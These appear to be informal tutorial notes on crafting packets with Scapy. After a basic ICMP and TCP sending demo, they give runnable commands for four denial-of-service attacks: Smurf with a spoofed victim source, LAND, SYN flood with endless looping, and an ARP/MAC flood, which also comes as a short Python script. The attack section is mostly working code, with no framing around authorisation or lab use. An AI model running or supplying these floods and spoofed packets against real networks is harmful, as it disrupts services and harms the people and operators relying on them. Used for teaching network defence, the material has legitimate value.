

Network Operations with Scapy
------------------------------

Scapy is a powerful interactive packet manipulation/crafting program/framework.

+ Install it

# apt install python3-scapy -y
OR
# yum install epel-release -y
# yum install scapy -y

+ Interective shell:

# scapy

ICMP example:
``````````````````` 
ip.src eq 1.1.1.1 && ip.dst eq 8.8.8.8



>>> x = IP()
>>> y = ICMP()
>>> x.show()
>>> y.show()

>>> x.src="x.x.x.x"
>>> x.dst="x.x.x.x"

>>> send(x/y)
OR
>>> send(x/y/"LOLOLOLOL")
or
>>> send(x/y, count=10)
or 
>>> send(x/y, loop=1)


+ CHECK IN WIRESHARK
_______________________________________
Send TCP Packets:
----------
>>> a = IP()
>>> b = TCP()
>>> a.src="x.x.x.x"
>>> a.dst="196.1.113.45"
>>> b.sport=53
>>> b.dport=80
>>> b.flags = "S"

>>> send((a/b), count=10)
_______________________________________




Attacks that can be performed by Scapy Packet Crafting:
`````````````````````````````````````````````````````````
1. Smurf Attack
2. LAND Attack
3. SYN Flood Attack
4. MAC Flood

1. Smurf Attack - very old attack & its closed
`````````````````````````````````````````````````````````````
It involves an attacker sending ICMP req(ping) to network's broadcast address(x.x.x.255). The attacker spoofs the source of the ICMP request to be the IP address of the intended victim. 

Reason: ICMP does not incluse Handshake, the destination has no way of verifying the source IP.

Now routers are pre-configured to not relay ICMP requests.

# scapy

>>> x = IP()/ICMP()
>>> x.show()

>>> x.src="victim'IP"
>>> x.dst="target'IP"

>>> x.show()
>>> send(x,loop=1)

+ CHECK IN WIRESHARK

2. LAND Attack:
````````````````DoS (Denial of Service)

Attack in which a packet is sent to a target machine with the same address ( Source Address and destination address the same ).


# scapy

>>> x = IP()/TCP()
>>> x.show()

>>> x.src="victim'IP"
>>> x.dst="victim'IP"

>>> x.show()
>>> send(x,loop=1)


3. SYN Flood Attack
````````````````````
SYN flood is also known as a half-open attack. In this attack, the attacker sends multiple connection requests to perform the distributed denial of service attack.


# scapy

>>> a = IP()
>>> b = TCP()

>>> a.src="zombie'IP"
>>> a.dst="victim'IP"
>>> b.flags="s"

>>> send(a/b,loop=1)


4. MAC Flood:
``````````````
# scapy

>>> a = Ether()
>>> a.src=RandMAC()
>>> a.dst="ff:ff:ff:ff:ff:ff"

>>> b = ARP()
>>> b.pdst='192.168.1.255'
>>> b.hwdst="ff:ff:ff:ff:ff:ff"

>>> send(a/b, iface="eth0", count=10, inter=.001)

OR

#!/usr/bin/python3
from scapy.all import *
num = int(input("Enter the number of packets "))
interface = input("Enter the Interface ")

a = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")

b = ARP(pdst='192.168.1.255',hwdst="ff:ff:ff:ff:ff:ff")

try:
  send(a/b, iface=interface, count=num, inter=.001)

except : 
  print("Destination Unreachable ")
_______________________________________
